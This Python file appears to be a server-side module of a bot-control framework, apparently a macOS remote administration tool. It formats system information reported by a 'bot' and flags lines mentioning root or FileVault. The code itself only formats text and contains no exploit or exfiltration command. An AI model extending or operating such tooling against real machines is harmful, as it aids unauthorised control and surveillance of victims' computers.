# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Return basic information about the bot, formatted for readability.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        # The bot collects all system information automatically, no input required.
        return []

    def setup(self, set_options):
        return True, {}

    def process_response(self, response, response_options):
        """Formats the raw info report into aligned, labeled rows."""
        str_response = ""
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        self._view.output_separator()

        if not str_response.strip():
            self._view.output("No system information was returned by the bot.", "info")
            return

        rows = []
        flags = []

        for raw_line in str_response.splitlines():
            line = raw_line.strip()
            if not line:
                continue
            if ":" in line:
                key, _, value = line.partition(":")
                rows.append((key.strip(), value.strip()))
            else:
                flags.append(line)

        self._view.output("== System information ==")

        if rows:
            width = max(len(key) for key, _ in rows)
            for key, value in rows:
                display = value or "(unknown)"
                self._view.output("{:<{width}} : {}".format(key, display, width=width))
        else:
            self._view.output("(no key-value rows were detected)", "info")

        if flags:
            self._view.output_separator()
            for flag in flags:
                lowered = flag.lower()
                prefix = "warning" if ("root" in lowered or "filevault" in lowered) else "info"
                self._view.output(flag, prefix)
